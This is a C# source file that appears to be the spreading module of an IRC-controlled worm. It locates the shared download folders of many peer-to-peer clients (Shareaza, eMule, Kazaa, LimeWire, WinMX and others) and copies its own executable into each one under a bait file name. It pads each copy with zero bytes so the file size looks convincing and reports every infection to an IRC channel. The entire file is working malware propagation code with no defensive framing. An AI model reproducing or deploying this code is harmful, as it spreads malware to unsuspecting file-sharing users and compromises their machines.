using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace myApp
{
    internal class P2P
    {
        static string progpath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        public static void ShareazaStart(string filetoadd)
        {
            RegistryKey key1 = Registry.CurrentUser;
            RegistryKey shareaza = key1.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", false);
            if (shareaza != null)
            {
                object shareazapath = shareaza.GetValue("CollectionPath");
                String shareazashare = shareazapath + "\\";
                Copyfromlist(shareazashare, filetoadd);
            }
        }

        public static void EmuleStart(string filetoadd)
        {
            string docpath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            string emulepath = docpath.Replace("Documents", @"Downloads\eMule\Incoming\");
            string emuleoldpath = progpath + @"\emule\incoming\";
            Copyfromlist(emulepath, filetoadd);
            Copyfromlist(emuleoldpath, filetoadd);
        }

        public static void KazaaStart(string filetoadd)
        {
            string kazaapath = progpath + @"\kazaa\my shared folder\";
            string kazaalitepath = progpath + @"\kazaa lite\my shared folder\";
            string kazaalitepluspath = progpath + @"\kazaa lite k++\my shared folder\";
            Copyfromlist(kazaapath, filetoadd);
            Copyfromlist(kazaalitepath, filetoadd);
            Copyfromlist(kazaalitepluspath, filetoadd);

        }

        public static void IcqStart(string filetoadd)
        {
            string icqpath = progpath + @"\icq\shared folder\";
            Copyfromlist(icqpath, filetoadd);
        }

        public static void GroksterStart(string filetoadd)
        {
            string groksterpath = progpath + @"\grokster\my grokster\";
            Copyfromlist(groksterpath, filetoadd);
        }

        public static void BearshareStart(string filetoadd)
        {
            string bearsharepath = progpath + @"\bearshare\shared\";
            Copyfromlist(bearsharepath, filetoadd);
        }

        public static void Edonkey2000Start(string filetoadd)
        {
            string edonkey2000Path = progpath + @"\edonkey2000\incoming\";
            Copyfromlist(edonkey2000Path, filetoadd);
        }


        public static void MorpheusStart(string filetoadd)
        {
            string morpheuspath = progpath + @"\morpheus\my shared folder\";
            Copyfromlist(morpheuspath, filetoadd);
        }

        public static void LimewireStart(string filetoadd)
        {
            string limewirepath = progpath + @"\limewire\shared\";
            Copyfromlist(limewirepath, filetoadd);
        }

        public static void TeslaStart(string filetoadd)
        {
            string teslapath = progpath + @"\tesla\files\";
            Copyfromlist(teslapath, filetoadd);
        }

        public static void WinmxStart(string filetoadd)
        {
            string winmxpath = progpath + @"\winmx\shared\";
            Copyfromlist(winmxpath, filetoadd);
        }



        public static void Copyfromlist(String cPath, String rlzname)
        {
            if (Directory.Exists(cPath))
            {
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  8Spreading in : " + cPath + rlzname);

                if (!File.Exists(cPath + rlzname))
                {
                    try
                    {
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, cPath + rlzname, true);
                        FileStream filetoadd = File.OpenWrite(cPath + rlzname);
                        long siza = filetoadd.Seek(0, SeekOrigin.End);
                        int size = Convert.ToInt32(rlzname.Length);
                        decimal bite = size * 10485;
                        while (siza < bite)
                        {
                            siza++;
                            filetoadd.WriteByte(0);
                        }
                        filetoadd.Close();
                    }
                    catch
                    {
                    }
                }

            }
        }
    }
}